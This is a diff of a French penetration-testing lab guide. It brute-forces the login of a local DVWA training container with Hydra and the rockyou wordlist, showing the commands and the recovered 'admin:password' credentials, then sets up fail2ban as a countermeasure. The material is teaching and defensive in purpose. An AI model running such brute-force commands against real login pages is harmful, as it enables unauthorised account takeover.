-**Checkpoint :** Hydra a trouvé `password` comme mot de passe admin. En 10 secondes, un mot de passe trivial est compromis.
+**Explication :** `-l admin` fixe le login. `-P` donne la wordlist. `-s 8088` spécifie le port non standard. Le module `http-post-form` reçoit 3 paramètres séparés par `:` : l'URL (`/login.php`), la chaîne POST (avec `^USER^` et `^PASS^` remplacés à chaque tentative), et le message d'échec. `-V` affiche chaque tentative. `tee` sauvegarde le résultat.
+
+> **Checkpoint :** Hydra a trouvé `password` comme mot de passe admin. En 10 secondes, un mot de passe trivial est compromis.
+
+---
 
 ### Étape 3 — Test multi-logins
 
-**Contexte :** Dans un vrai test, on ne connaît pas forcément le nom d'utilisateur. On teste donc plusieurs logins courants (`admin`, `root`, `user`, etc.) avec la même wordlist. L'option `-F` arrête Hydra dès qu'un couple valide est trouvé, ce qui évite de gaspiller du temps.
+**Objectif :** Tester plusieurs noms d'utilisateur courants avec la même wordlist, sans connaître le login à l'avance.
 
-**Flags :**
-- `-L /tmp/logins.txt` (login list) : fichier contenant plusieurs noms d'utilisateur à tester
-- `-P /usr/share/wordlists/rockyou.txt` (password list) : wordlist de mots de passe
-- `-F` (first found) : s'arrête au premier couple login:password valide trouvé
-- `-s 8088` : port non standard de DVWA
-- `tee hydra_multi.txt` : sauvegarde la sortie pour le rapport
+**Où ?** Terminal 1 — `cd rendu_labs/jour-01`
 
+**Actions :**
+1. Créer une liste de logins : `admin`, `test`, `root`, `user`, `administrateur`
+2. Lancer Hydra avec `-L` (liste de logins) et `-F` (s'arrêter au premier trouvé)
+
+**Commande :**
 ```bash
 echo -e "admin\ntest\nroot\nuser\nadministrateur" > /tmp/logins.txt
 
@@ -1339,41 +1398,34 @@ hydra -L /tmp/logins.txt -P /usr/share/wordlists/rockyou.txt \
   | tee hydra_multi.txt
 ```
 
-Sortie attendue :
-
-```console
+**Résultat attendu :**
+```
 [8088][http-post-form] host: localhost   login: admin   password: password
 [STATUS] attack finished for localhost (valid pair found)
 ```
 
-**Checkpoint :** Quel que soit le login testé, Hydra trouve le couple valide `admin:password`. Le mot de passe est le maillon faible.
+**Explication :** `-L` (majuscule) charge une liste de logins depuis un fichier. `-F` arrête Hydra dès qu'un couple valide est trouvé, économisant du temps. Le login `admin` avec le mot de passe `password` est trouvé en premier.
 
-### 🔒 Contre-mesure (M1036 Account Lockout + M1027 Password Policies)
+> **Checkpoint :** Quel que soit le login testé, Hydra trouve le couple valide `admin:password`. Le mot de passe est le maillon faible.
 
-| Attaque | Défense active | Code de correction |
-|---------|----------------|-------------------|
-| Brute-force HTTP | **fail2ban** : bannir l'IP après N échecs | `maxretry=5, findtime=600, bantime=900` |
-| Wordlist courante | **Politique de mots de passe** | Longueur minimale 12 + complexité (pam_pwquality) |
-| Identifiants par défaut | **Changement obligatoire au premier login** | `chage -d 0 <user>` force le changement au prochain login |
-| Auth sans limite | **Rate limiting applicatif** | `sleep(1)` après chaque échec, compteur en session |
+---
 
-**Contexte :** fail2ban est un framework de bannissement automatique qui surveille les logs Apache. Si trop de tentatives échouées sont détectées dans un intervalle de temps, il bannit l'IP attaquante via iptables. On installe fail2ban sur le conteneur DVWA, on crée une règle pour le formulaire de login, et on vérifie que le brute-force est neutralisé.
+### 🔒 Contre-mesure (M1036 + M1027)
 
-**Flags :**
-- `docker exec dvwa-target bash -c "..."` : exécute une commande dans le conteneur DVWA
-- `apt-get update && apt-get install -y fail2ban` : installe fail2ban dans le conteneur
-- `cat > /etc/fail2ban/jail.local << 'EOF'...EOF` : crée le fichier de configuration de la jail
-- `maxretry = 5` : 5 échecs autorisés avant bannissement
-- `findtime = 600` : fenêtre de 10 minutes (600 secondes)
-- `bantime = 900` : durée de bannissement de 15 minutes (900 secondes)
-- `fail2ban-client reload` : recharge la configuration
-- `fail2ban-client status apache-dvwa` : vérifie que la règle est active
+**Objectif :** Bloquer les attaques par force brute en limitant le nombre de tentatives avec fail2ban.
 
+**Où ?** Terminal 1
+
+**Actions :**
+1. Installer fail2ban dans le conteneur DVWA
+2. Créer une règle de bannissement pour le login DVWA (5 échecs → banni 15 min)
+3. Vérifier que la règle est active
+4. Re-tester Hydra pour confirmer le blocage
+
+**Commande :**
 ```bash
-# Installer fail2ban sur le conteneur DVWA
 docker exec dvwa-target bash -c "apt-get update && apt-get install -y fail2ban"
 
-# Créer une règle fail2ban pour le login DVWA
 docker exec dvwa-target bash -c "cat > /etc/fail2ban/jail.local << 'EOF'
 [apache-dvwa]
 enabled  = true
@@ -1386,19 +1438,16 @@ bantime  = 900
 EOF
 fail2ban-client reload"
 
-# Vérification : la règle est active
 docker exec dvwa-target bash -c "fail2ban-client status apache-dvwa"
 # → Status for the jail: apache-dvwa  |  Currently banned: 0
 
-# Re-tester Hydra après fail2ban
-# hydra ... → [ERROR] connection refused!  (l'IP est bannie)
+# Re-tester Hydra après fail2ban :
+# hydra ... → [ERROR] connection refused!  (l'IP est bannie après 5 échecs)
 ```
 
-> **Checkpoint défensif :** Avec fail2ban actif, Hydra ne peut plus tester que 5 mots de passe avant le banissement temporaire. Le brute-force est neutralisé à l'échelle réseau.
+**Résultat attendu :** `fail2ban-client status` confirme que la règle est active. Après 5 tentatives échouées, Hydra reçoit une erreur `connection refused` — l'IP est bannie.
 
-> **📌 À retenir :** On a brute-forcé le login DVWA avec Hydra et rockyou.txt — `admin:password` trouvé en 10 secondes ([T1110](https://attack.mitre.org/techniques/T1110/) Brute Force).  
-> **Attendu :** Mot de passe `password` trouvé pour l'utilisateur `admin`.  
-> **Défense :** fail2ban (bloque après 5 échecs), politique de mots de passe robustes (12+ caractères), rate-limiting applicatif.
+**Explication :** fail2ban surveille les logs Apache (/var/log/apache2/error.log). Quand il détecte 5 échecs (`maxretry=5`) en 10 minutes (`findtime=600`), il crée une règle iptables qui bloque l'IP attaquante pendant 15 minutes (`bantime=900`). Le brute-force est neutralisé à l'échelle réseau, indépendamment de l'application.
 
 ### Résultat attendu
 
